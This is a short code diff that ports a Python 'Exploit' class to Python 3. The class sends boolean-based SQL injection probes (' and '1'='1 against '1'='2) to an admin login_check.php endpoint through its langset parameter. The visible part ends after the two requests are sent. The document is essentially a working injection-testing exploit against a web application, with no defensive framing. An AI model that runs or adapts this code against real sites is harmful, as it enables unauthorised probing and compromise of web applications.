@@ -1,13 +1,14 @@
 # coding:utf-8
 # http://www.arpne.com/
 import requests
-import urllib2
+from urllib.parse import quote
+
 
 class Exploit:
 
     def attack(self, url):
-        true_url = url + "/admin/login/login_check.php?langset=cn" + urllib2.quote("' and '1' ='1")
-        false_url = url + "/admin/login/login_check.php?langset=cn" + urllib2.quote("' and '1' ='2")
+        true_url = url + "/admin/login/login_check.php?langset=cn" + quote("' and '1' ='1")
+        false_url = url + "/admin/login/login_check.php?langset=cn" + quote("' and '1' ='2")
 
         response = requests.get(true_url)
         response2 = requests.get(false_url)
